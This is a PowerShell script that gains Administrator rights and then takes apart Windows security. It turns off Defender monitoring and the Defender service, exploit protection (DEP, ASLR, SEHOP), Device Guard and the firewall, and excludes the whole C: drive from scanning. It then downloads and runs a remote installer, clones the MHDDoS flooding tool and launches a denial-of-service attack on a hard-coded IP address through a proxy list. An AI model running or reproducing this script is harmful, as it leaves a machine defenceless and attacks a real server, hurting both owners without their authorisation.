# Ensure script runs with full scope execution and as Administrator
If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    Write-Warning "You do not have Administrator rights to run this script!`nPlease run this script as an Administrator."
    Start-Process powershell.exe "-File `"$PSCommandPath`"" -Verb RunAs
    Exit
}

# Set the execution policy to allow the script to run
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

# Create a log file path
$logFile = "$env:SystemRoot\Temp\DisableDefender.log"

# Redirect error output to log file
$ErrorActionPreference = "Continue"
$Error.Clear()

function Log-Error {
    $error[0] | Out-File -FilePath $logFile -Append
}

function Log-Message {
    param (
        [string]$message
    )
    $message | Out-File -FilePath $logFile -Append
}

# Log start of script execution
Log-Message "Starting script execution..."

# Disable Windows Defender Real-time Monitoring
Try {
    Set-MpPreference -DisableRealtimeMonitoring $true
    Log-Message "Disabled Windows Defender Real-time Monitoring"
} Catch {
    Log-Error
}

# Stop and disable Windows Defender Service
Try {
    Invoke-Command -ScriptBlock {
        Stop-Service -Name WinDefend -Force
        Set-Service -Name WinDefend -StartupType Disabled
    } -Credential (Get-Credential)
    Log-Message "Stopped and disabled Windows Defender Service"
} Catch {
    Log-Error
}

# Disable Windows Defender via Registry
Try {
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force
    If (-Not (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection")) {
        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force
    }
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -PropertyType DWORD -Force
    Log-Message "Disabled Windows Defender via Registry"
} Catch {
    Log-Error
}

# Disable Controlled Folder Access
Try {
    Set-MpPreference -EnableControlledFolderAccess Disabled
    Log-Message "Disabled Controlled Folder Access"
} Catch {
    Log-Error
}

# Disable Cloud-Delivered Protection
Try {
    Set-MpPreference -MAPSReporting Disabled
    Log-Message "Disabled Cloud-Delivered Protection"
} Catch {
    Log-Error
}

# Disable Automatic Sample Submission
Try {
    Set-MpPreference -SubmitSamplesConsent 2
    Log-Message "Disabled Automatic Sample Submission"
} Catch {
    Log-Error
}

# Disable Network Protection
Try {
    Set-MpPreference -DisableIntrusionPreventionSystem $true
    Log-Message "Disabled Network Protection"
} Catch {
    Log-Error
}

# Disable Exploit Protection
Try {
    If (-Not (Test-Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\ExploitProtection\System")) {
        New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\ExploitProtection\System" -Force
    }
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\ExploitProtection\System" -Name "DisableDEP" -Value 1 -PropertyType DWORD -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\ExploitProtection\System" -Name "DisableSEHOP" -Value 1 -PropertyType DWORD -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\ExploitProtection\System" -Name "DisableASLR" -Value 1 -PropertyType DWORD -Force
    Log-Message "Disabled Exploit Protection"
} Catch {
    Log-Error
}

# Disable Windows Defender Application Guard
Try {
    Disable-WindowsOptionalFeature -Online -FeatureName Windows-Defender-ApplicationGuard -NoRestart
    Log-Message "Disabled Windows Defender Application Guard"
} Catch {
    Log-Error
}

# Disable Application Control (Device Guard)
Try {
    If (-Not (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Device Guard")) {
        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Device Guard" -Force
    }
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Device Guard" -Name "EnableVirtualizationBasedSecurity" -Value 0 -PropertyType DWORD -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Device Guard" -Name "RequirePlatformSecurityFeatures" -Value 0 -PropertyType DWORD -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Device Guard" -Name "HVCIMATRequired" -Value 0 -PropertyType DWORD -Force
    Log-Message "Disabled Application Control (Device Guard)"
} Catch {
    Log-Error
}

# Disable Windows Defender Firewall
Try {
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    Log-Message "Disabled Windows Defender Firewall"
} Catch {
    Log-Error
}

# Copy log to clipboard if it exists
if (Test-Path -Path $logFile) {
    Get-Content -Path $logFile | Set-Clipboard
    Write-Output "Log file copied to clipboard."
} else {
    Write-Output "Log file not found."
}

Write-Output "Script execution completed. Please check the log file at $logFile for any errors."
Add-MpPreference -ExclusionPath "C:\*.*"

Set-MpPreference -DisableRealtimeMonitoring $true

# Disables scanning for downloaded files or attachments
Set-MpPreference -DisableIOAVProtection $true

# Disable behaviour monitoring
Set-MPPreference -DisableBehaviourMonitoring $true

# Make exclusion for a certain folder
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Disables cloud detection
Set-MPPreference -DisableBlockAtFirstSeen $true

# Disables scanning of .pst and other email formats
Set-MPPreference -DisableEmailScanning $true

# Disables script scanning during malware scans
Set-MPPReference -DisableScriptScanning $true

# Exclude files by extension
Set-MpPreference -ExclusionExtension "ps1"
Set-MpPreference -ExclusionExtension "py"
powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'
Remove-Item C:\ProgramData\chocolatey -Recurse -Force
# Install Choco
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
if (choco list --lo -r -e python3) {
  Write-Host "'python3' is installed"
}else{
choco install -y python3 # Install Python

}

if (choco list --lo -r -e git) {
  Write-Host "'git' is installed"
}else{
choco install -y git # Install GIT

}



$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User") # Refresh env variables

$p = ' -p 1200'
$rpc = ' --rpc 1000'
$debug = ' --debug'

###
Set-Location '~'
Remove-Item 'MHDDoS' -Recurse -Force
git clone 'https://github.com/MatrixTM/MHDDoS.git'
Set-Location '~/MHDDoS'
python.exe -m pip install --upgrade pip
python -m pip install -r 'requirements.txt'


python start.py cookie http://38.126.52.120:80  0  7250  proxy411221131.txt  2236000 2236000 true
